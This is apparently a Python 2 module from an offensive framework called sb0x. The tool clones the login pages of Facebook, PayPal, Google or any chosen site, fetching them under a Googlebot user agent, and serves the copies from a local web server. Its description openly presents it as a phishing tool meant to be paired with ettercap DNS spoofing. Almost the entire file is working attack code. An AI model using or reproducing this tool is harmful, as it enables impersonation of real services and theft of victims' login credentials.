"""
pishWeeMan.py - Create Phishing Mirror for website

Author: Levi Nachamni (levi0x0)
Date: 20/05/2014
Version: 0.1
License: GPL 3

Description:
	pishWeeeMan will create Phishing Sites you can Use ettercap for dns_spoof

"""

MODULE_NAME = "PhishWeeMan"
MODULE_AUTHOR = "Levi Nachmani (levi0x0)"
MODULE_LICENSE = "GPL 3"
MODULE_VERSION = "0.1"
MODULE_DESC = "PhishWeeeMan will create Mirror Sites for Phishing,  You Can Use ettercap for dns_spoof"

import SimpleHTTPServer
import SocketServer
import sys
import os
from shutil import rmtree
import urllib2
from api.std import *

PWM_DIR="/tmp/sb0x-PhishWeeMan"

USER_AGENT = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'


class run_server(object):
	"""Create the PythonSimpleModule"""
	
	def __init__(self, website, port):
		self.website = website
		self.port = port

	def create_mirror(self):
		notify("Createing mirror for: %s" %(self.website))
		self.opener = urllib2.build_opener()
		self.opener.addheaders = [('User-Agent', USER_AGENT)]
		self.open = self.opener.open(self.website).read()
		self.indexhtml = "%s/index.html" % (PWM_DIR)
		self.index = open(self.indexhtml, "wr")
		self.index.write(self.open)
		self.index.close()
	def run(self):
		os.chdir(PWM_DIR)
		self.handler = SimpleHTTPServer.SimpleHTTPRequestHandler
		self.http = SocketServer.TCPServer(("", self.port), self.handler)

		print "\n\033[01;33m[!] sb0x PhishWeMan %s Started on port: localhost:%d...\033[01;00m" % (MODULE_VERSION, self.port)

		self.http.serve_forever()



def menu():
	notify("PhishWeeMan: %s - Create mirror site for Phishing" %(MODULE_VERSION))
	print "\033[01;33m"
	print "=> 1. facebook.com"
	print "=> 2. paypal.com"
	print "=> 3. youtube.com"
	print "=> 4. gmail.com"
	print "=> 5. custom"
	print "\033[00m"
	answer = int(raw_input("=> "))
	if answer == 1:
		website = "http://facebook.com/index.php"
	elif answer == 2:
		website = "https://www.paypal.com/login"
	elif answer == 3:
		website = "https://accounts.google.com"
	elif answer == 4:
		 website = "https://accounts.google.com"
	elif answer == 5:
		website = raw_input("Web Site:")
	return website

def cleanup():
	print "\n\033[01;34m[!] Cleanup..\033[00m"
	if os.path.isdir(PWM_DIR):
		rmtree(PWM_DIR)
	else:
		pass
def run():
	if os.path.isdir(PWM_DIR):
		pass
	else:
		os.mkdir(PWM_DIR)
	website = menu()
	warning("For port: 80 run sb0x as root.")
	port = int(raw_input("Port: (Example: 2020):"))
	start = run_server(website, port)
	start.create_mirror()
	start.run()	
	#cleanup
	cleanup()

def main():
	try:
		run()
	except KeyboardInterrupt:
		notify("\nServer stopped.., Interrupt")
		cleanup()
	except Exception as e:
		notify("\n Server Stopped..")
		cleanup()

